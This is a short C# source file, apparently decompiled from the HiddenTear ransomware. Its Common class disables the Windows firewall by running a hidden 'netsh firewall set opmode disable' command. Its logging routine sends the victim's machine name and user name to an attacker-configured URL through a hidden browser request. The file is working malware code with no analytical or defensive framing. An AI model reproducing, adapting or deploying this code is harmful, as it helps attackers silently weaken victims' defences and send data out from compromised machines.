using System;
using System.Diagnostics;
using System.Net;
using System.Windows.Forms;

namespace HiddenTear;

public class Common
{
	private static bool _penetratedFirewall;

	public static bool penetratedFirewall
	{
		get
		{
			if (_penetratedFirewall)
			{
				return true;
			}
			if (PenetrateFirewall())
			{
				_penetratedFirewall = true;
				return true;
			}
			return false;
		}
	}

	public static void Log(string message)
	{
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Invalid comparison between Unknown and I4
		if (string.IsNullOrEmpty(Settables.LOGURL))
		{
			return;
		}
		string text = Environment.MachineName + "-" + Environment.UserName + " : " + message;
		string text2 = Settables.LOGURL + text;
		if (!penetratedFirewall)
		{
			return;
		}
		WebBrowser val = new WebBrowser();
		try
		{
			val.Navigate(text2);
			while ((int)val.get_ReadyState() != 4)
			{
				Application.DoEvents();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static bool PenetrateFirewall()
	{
		using WebClient webClient = new WebClient();
		try
		{
			webClient.DownloadString("http://www.websitetest.com/");
			return true;
		}
		catch
		{
			try
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = "cmd.exe",
					Arguments = "netsh firewall set opmode disable"
				};
				process.Start();
				process.WaitForExit();
				return true;
			}
			catch
			{
				return false;
			}
		}
	}
}
